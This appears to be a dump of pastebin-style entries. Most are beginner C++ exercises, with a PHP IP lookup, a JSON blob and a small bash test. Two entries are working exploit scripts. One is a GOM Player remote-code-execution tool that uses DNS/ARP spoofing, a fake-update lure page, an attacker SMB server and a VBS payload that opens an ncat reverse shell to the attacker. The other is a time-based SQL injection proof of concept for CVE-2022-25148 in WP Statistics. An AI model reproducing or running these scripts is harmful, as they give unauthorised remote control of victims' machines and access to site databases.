id,title,username,language,date,content
0yZ6W49E,Untitled,Josif_tepe,C++,Saturday 20th of January 2024 06:01:57 AM CDT,"#include <iostream>
using namespace std;

int main() {
   
    int a, b, c;
    cin >> a;
    cin >> b;
    cin >> c;
    
    if(a <= b and a <= c) {
        cout << a << endl;
        if(b <= c) {
            cout << b << endl;
            cout << c << endl;
        }
        else {
            cout << c << endl;
            cout << b << endl;
        }
    }
    else if(b <= a and b <= c) {
        cout << b << endl;
        if(a <= c) {
            cout << a << endl;
            cout << c << endl;
        }
        else {
            cout << c << endl;
            cout << a << endl;
        }
    }
    else {
        cout << c << endl;
        if(a <= b) {
            cout << a << endl;
            cout << b << endl;
        }
        else {
            cout << b << endl;
            cout << a << endl;
        }
    }
    return 0;
}
"
wTpcw2Lp,data817,TestGuy1,JSON,Saturday 20th of January 2024 06:00:07 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '9f0d841f681df7e49e42a6d21049e5c95a156da36ee204038c9a92f9913d5930a6f9cd4247200c039223d637f6f2c8a3e3ab5b19afe5a19a2cbf3b62b1bfe51fe7a60c91c6d688b37bcc69664eabc643985a647bfb98e5df6a23bd104727522ab8de7de426f21b42b518a918c397322b69f89e3c0c3e20fd0a79c71c13efd5bc',
  otherdata: [
    'c9ed17ff638bd5abdf0ffdb66f2b87a5',
    '1fbc3562ebabf74464ca42ed7df636b2',
    'bd951c59c468200ee2c02f3aa7fb9737',
    '7a6ccf07a04ad8eaa62ae3e5b5aeadea',
    'f00be90640e072dd09cf5bf88e4b7d71',
    '9b4efa69531b43913dba46f49b444ea6',
    'e29ae2bde340e81bccad3dba7f920fdc',
    'afe3815c0e63d72132dc18c76eea4f4f'
  ]
}"
zaryw2AY,IP LookUP,ngatmuri,PHP,Saturday 20th of January 2024 05:56:15 AM CDT,"<?php 
    // persiapkan curl
    $ch = curl_init(); 

    // set url 
    curl_setopt($ch, CURLOPT_URL, ""http://dynupdate.no-ip.com/ip.php"");

    // return the transfer as a string 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 

    // $output contains the output string 
    $output = curl_exec($ch); 

    // tutup curl 
    curl_close($ch);      

    // menampilkan hasil curl
    echo $output;
?>"
Arh4yZin,Untitled,Josif_tepe,C++,Saturday 20th of January 2024 05:53:38 AM CDT,"#include <iostream>
using namespace std;

int main() {
   
    int x;
    cin >> x;
    
    if(x % 2 == 0) {
        cout << ""PAREN"" << endl;
    }
    else {
        cout << ""NEPAREN"" << endl;
    }
    
    return 0;
}
"
p4pAi4Pr,Untitled,Josif_tepe,C++,Saturday 20th of January 2024 05:52:10 AM CDT,"#include <iostream>
using namespace std;

int main() {
   
    int a, b, c;
    cin >> a;
    cin >> b;
    cin >> c;
    
    if(a + b > c and a + c > b and b + c > a) {
        cout << ""DA"" << endl;
    }
    else {
        cout << ""NE"" << endl;
    }
    
    return 0;
}
"
5vb1vbpq,GOM Player 2.3.90.5360 - Remote Code Execution (RCE),FlyFar,Python,Saturday 20th of January 2024 05:49:44 AM CDT,"# Exploit Title: GOM Player 2.3.90.5360 - Remote Code Execution (RCE)
# Date: 26.08.2023
# Author: M. Akil Gündoğan
# Contact: https://twitter.com/akilgundogan
# Vendor Homepage: https://www.gomlab.com/gomplayer-media-player/
# Software Link: https://cdn.gomlab.com/gretech/player/GOMPLAYERGLOBALSETUP_NEW.EXE
# Version: 2.3.90.5360 
# Tested on: Windows 10 Pro x64 22H2 19045.3324
# PoC Video: https://www.youtube.com/watch?v=8d0YUpdPzp8

# Impacts: GOM player has been downloaded 63,952,102 times according to CNET. It is used by millions of people worldwide.

# Vulnerability Description: 
# The IE component in the GOM Player's interface uses an insecure HTTP connection. Since IE is vulnerable to the 
# SMB/WebDAV+ ""search-ms"" technique, we can redirect the victim to the page we created with DNS spoofing and execute code on the target.
# In addition, the URL+ZIP+VBS MoTW bypass technique was used to prevent the victim from seeing any warning in the pop-up window. 

# Full disclosure, developers should be more careful about software security.

# Exploit Usage: Run it and enter the IP address of the target. Then specify the port to listen to for the reverse shell.

# Some spaghetti and a bad code but it works :)

banner = """"""\033[38;5;196m+-----------------------------------------------------------+
|     GOM Player 2.3.90.5360 - Remote Code Execution        |
|   Test edildi, sinifta kaldi. Bu oyun hic bitmeyecek :-)  |
+-----------------------------------------------------------+\033[0m"""""" +"""""" 
\033[38;5;117m[*]- Author: M. Akil Gundogan - rootkit.com.tr\n\033[0m""""""

import time,os,zipfile,subprocess,socket,sys

print(banner)

if os.geteuid() != 0:
    print(""You need root privileges to run the exploit, please use sudo..."")
    sys.exit(1)

targetIP = input(""- Target IP address: "")
listenPort = input(""- Listening port for Reverse Shell: "")

def fCreate(fileName,fileContent): # File create func. 
    f = open(fileName,""w"")
    f.write(fileContent)
    f.close()    

gw = os.popen(""ip -4 route show default"").read().split()
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect((gw[2], 0))
ipaddr = s.getsockname()[0]
gateway = gw[2]
host = socket.gethostname()
print (""- My IP:"", ipaddr, "" Gateway:"", gateway, "" Host:"", host) 

print(""\n[*]- Stage 1: Downloading neccesary tools..."")

smbFolderName = ""GomUpdater"" # change this (optional)
expWorkDir = ""gomExploitDir"" # change this (optional)
os.system(""mkdir "" + expWorkDir +"" >/dev/null 2>&1 &"") # Creating a working directory for the exploit.
time.sleep(1) # It's necessary for exploit stability. 
os.system(""cd "" + expWorkDir + ""&& mkdir smb-shared web-shared >/dev/null 2>&1 &"") # Creating a working directory for the exploit.
time.sleep(1) # It's necessary for exploit stability. 
os.system(""cd "" + expWorkDir + ""/smb-shared && wget https://nmap.org/dist/ncat-portable-5.59BETA1.zip >/dev/null 2>&1 && unzip -o -j ncat-portable-5.59BETA1.zip >/dev/null 2>&1 && rm -rf ncat-portable-5.59BETA1.zip README"") #Downloading ncat
print(""    [*] - Ncat has been downloaded."")
subprocess.run(""git clone https://github.com/fortra/impacket.git "" + expWorkDir + ""/impacket >/dev/null 2>&1"",shell=True) # Downloading Impacket
print(""    [*] - Impacket has been downloaded."")
subprocess.run(""git clone https://github.com/dtrecherel/DNSSpoof.git "" + expWorkDir + ""/dnsspoof >/dev/null 2>&1"",shell=True) # Downloading DNSSpoof.py
print(""    [*] - DNSSpoof.py has been downloaded."")

print(""[*]- Stage 2: Creating Attacker SMB Server..."")
subprocess.Popen(""cd gomExploitDir/impacket/examples && python3 smbserver.py ""+smbFolderName+"" ../../smb-shared -smb2support >/dev/null 2>&1"",shell=True) # Running SMB server.
time.sleep(5) # It's necessary for exploit stability. 

smbIP = ipaddr
spoofUrl = ""playinfo.gomlab.com"" # Web page that causes vulnerability because it is used as HTTP

print(""[*]- Stage 3: Creating Attacker Web Page..."")

# change this (optional) 
screenExpPage = """"""
<meta charset=""utf-8"">
<script> window.alert(""GOM Player için acil güncelleme yapılmalı ! Açılan pencerede lütfen updater'a tıklayın."");</script> 
<script>window.location.href= 'search-ms:displayname=GOM Player Updater&crumb=System.Generic.String%3AUpdater&crumb=location:%5C%5C""""""+smbIP+""""""';
</script>
""""""

fCreate(expWorkDir + ""/web-shared/screen.html"",screenExpPage)
time.sleep(3) # It's necessary for exploit stability. 

print(""[*]- Stage 4: Creating URL+VBS for MoTW bypass placing it into the ZIP archive..."")
vbsCommand = '''Set shell=CreateObject(""wscript.shell"") 
Shell.Run(""xcopy /y \\\\yogurt\\ayran\\ncat.exe %temp%"")
WScript.Sleep 5000
Shell.Run(""cmd /c start /min cmd /c %temp%\\ncat.exe attackerIP attackerPort -e cmd"")''' # change this (optional)
vbsCommand = vbsCommand.replace(""yogurt"", smbIP).replace(""ayran"", smbFolderName).replace(""attackerIP"",smbIP).replace(""attackerPort"",listenPort)
fCreate(expWorkDir + ""/payload.vbs"",vbsCommand)

urlShortcut = '''[InternetShortcut]
URL=file://'''+smbIP+""/""+smbFolderName+'''/archive.zip/payload.vbs
IDlist='''
fCreate(expWorkDir + ""/smb-shared/Updater.url"",urlShortcut)
time.sleep(3) # It's necessary for exploit stability. 
zipName = expWorkDir + ""/smb-shared/archive.zip""
payload_filename = os.path.join(expWorkDir, ""payload.vbs"")  

with zipfile.ZipFile(zipName, ""w"") as malzip:
    malzip.write(payload_filename, arcname=os.path.basename(payload_filename))

print(""[*]- Stage 5: Running the attacker's web server..."")
subprocess.Popen(""cd "" + expWorkDir + ""/web-shared && python3 -m http.server 80 >/dev/null 2>&1"",shell=True) # Running attacker web server with Python mini http.server
time.sleep(3) # It's necessary for exploit stability. 

print(""[*]- Stage 6: Performing DNS and ARP spoofing for the target..."")
subprocess.Popen(""python3 "" + expWorkDir + ""/dnsspoof/dnsspoof.py -d "" + spoofUrl + "" -t "" + targetIP + "">/dev/null 2>&1"",shell=True) # DNS Spoofing...
time.sleep(10) # It's neccesary for exploit stability.
os.system(""ping -c 5 "" + targetIP + "" >/dev/null 2>&1 &"") # Ping the target... 
os.system(""arping -c 5 "" + targetIP + "" >/dev/null 2>&1 &"") # ARPing the target.
print(""[*]- Stage 7: Waiting for the target to open GOM Player and execute the malicious URL shortcut...\n"")
subprocess.run(""nc -lvnp "" + listenPort,shell=True)
subprocess.run(""pkill -f smbserver.py & pkill -f http.server & pkill -f dnsspoof.py"",shell=True) # Closing background processes after exploitation...
            "
MyERBEg5,Untitled,Josif_tepe,C++,Saturday 20th of January 2024 05:49:19 AM CDT,"#include <iostream>
using namespace std;

int main() {
   
    int mesec;
    cin >> mesec;
    
    if(mesec == 2) {
        cout << 28 << endl;
    }
    else if(mesec == 1 or mesec == 3 or mesec == 5 or mesec == 7 or mesec == 8 or mesec == 10 or mesec == 12) {
        cout << 31 << endl;
    }
    else {
        cout << 30 << endl;
    }
    
    
    return 0;
}
"
s3M9uP8n,WP Statistics Plugin 13.1.5 current_page_id - Time based SQL injection - CVE-2022-25148,FlyFar,Python,Saturday 20th of January 2024 05:47:31 AM CDT,"# Exploit Title: WP Statistics Plugin <= 13.1.5 current_page_id - Time based SQL injection (Unauthenticated)
# Date: 13/02/2022
# Exploit Author: psychoSherlock
# Vendor Homepage: https://wp-statistics.com/
# Software Link: https://downloads.wordpress.org/plugin/wp-statistics.13.1.5.zip
# Version: 13.1.5 and prior
# Tested on: wp-statistics 13.1.5
# CVE : CVE-2022-25148
# Vendor URL: https://wordpress.org/plugins/wp-statistics/
# CVSS Score: 8.4 (High)

import argparse
import requests
import re
import urllib.parse


def main():
    parser = argparse.ArgumentParser(description=""CVE-2022-25148"")
    parser.add_argument('-u', '--url', required=True,
                        help='Wordpress base URL')

    args = parser.parse_args()

    baseUrl = args.url
    payload = ""IF(1=1, sleep(5), 1)""

    wp_session = requests.session()

    resp = wp_session.get(baseUrl)
    nonce = re.search(r'_wpnonce=(.*?)&wp_statistics_hit', resp.text).group(1)
    print(f""Gathered Nonce: {nonce}"")

    headers = {
        ""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15""}

    payload = urllib.parse.quote_plus(payload)
    exploit = f'/wp-json/wp-statistics/v2/hit?_=11&_wpnonce={nonce}&wp_statistics_hit_rest=&browser=&platform=&version=&referred=&ip=11.11.11.11&exclusion_match=no&exclusion_reason&ua=Something&track_all=1&timestamp=11&current_page_type=home&current_page_id={payload}&search_query&page_uri=/&user_id=0'
    exploit_url = baseUrl + exploit

    print(f'\nSending: {exploit_url}')

    resp = wp_session.get(exploit_url, headers=headers)

    if float(resp.elapsed.total_seconds()) >= 5.0:
        print(""\n!!! Target is vulnerable !!!"")
        print(f'\nTime taken: {resp.elapsed.total_seconds()}')
    else:
        print('Target is not vulnerable')


if __name__ == ""__main__"":
    main()
            "
CRqznmDr,Untitled,Josif_tepe,C++,Saturday 20th of January 2024 05:47:13 AM CDT,"#include <iostream>
using namespace std;

int main() {
    int x;
    cin >> x;
    
    
    if(x < 10) {
        cout << ""pomalo od 10"" << endl;
    }
    else if(x % 2 == 0) {
        cout << ""paren"" << endl;
    }
    else {
        cout << ""nisto od ova ne e tocno"" << endl;
    }
    
    
    
    return 0;
}
"
1FZjHM4X,sh_par_test.sh,FranzVuttke,Bash,Saturday 20th of January 2024 05:46:38 AM CDT,"#!/bin/bash
echo $#
echo ${#3}

"
